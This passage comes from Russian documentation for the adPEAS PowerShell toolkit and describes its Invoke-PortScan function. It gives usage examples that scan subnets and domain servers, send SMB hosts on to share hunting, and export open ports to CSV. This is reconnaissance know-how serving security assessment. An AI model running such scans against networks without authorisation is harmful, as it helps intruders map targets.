и веб-интерфейсы администрирования. Другие порты можно указать через `-Port`;
если служба известна adPEAS, её название отображается в результатах.

**Примеры использования:**

```powershell
# Сеть и порты по умолчанию
Invoke-PortScan -Target 10.1.2.0/24

# Диапазон адресов и выбранные порты с коротким тайм-аутом
Invoke-PortScan 10.1.2.10-50 -Port 22,80,443,8000-8100 -TimeoutMs 500

# Подсети из Get-NetworkMap -ExportTargets: проверка SMB с экспортом CSV
Get-Content .\subnets.txt | Invoke-PortScan -Port 445 -ExportOpenPorts .\smb.csv

# Узлы, на которых первый проход нашёл WinRM: проверка дополнительных портов
Import-Csv .\open.csv | Where-Object Port -eq 5985 | Invoke-PortScan -Port 1-1024

# CSV как перечень адрес:порт для других инструментов
Import-Csv .\open.csv | ForEach-Object { "$($_.IPAddress):$($_.Port)" }

# Серверы домена: проверка портов СУБД
Get-DomainComputer -OperatingSystem '*Server*' | Invoke-PortScan -Port 1433,3306,5432

# Узлы с доступным SMB: передать в поиск общих ресурсов
Invoke-PortScan -Target 10.1.2.0/24 -Port 445 -PassThru | Invoke-ShareHunt

# Активные компьютеры домена: только при явном запросе
Invoke-PortScan -DomainComputers -Domain contoso.com -Credential (Get-Credential)
```

---

**Формат CSV** (`-ExportOpenPorts`): одна строка на открытый порт, для узлов без открытых портов строк нет.

```
"IPAddress","HostName","Port","Service"
"10.1.2.21","fs01.contoso.com","445","SMB"
"10.1.2.21","fs01.contoso.com","3389","RDP"
"10.1.2.30","","22","SSH"
```

Независимо от региональных настроек CSV использует запятую, поэтому `Import-Csv` прочитает его на любом компьютере.
Excel с региональным разделителем «точка с запятой» при двойном щелчке может открыть всё в одном
столбце; импорт через *Данные > Из текста/CSV* разбирает файл корректно.

---

## Навигация

- [Назад: модули Set- и New-](07-Set-Modules.md)
- [Далее: архитектура](09-Architecture.md)
- [На главную](00-Home.md)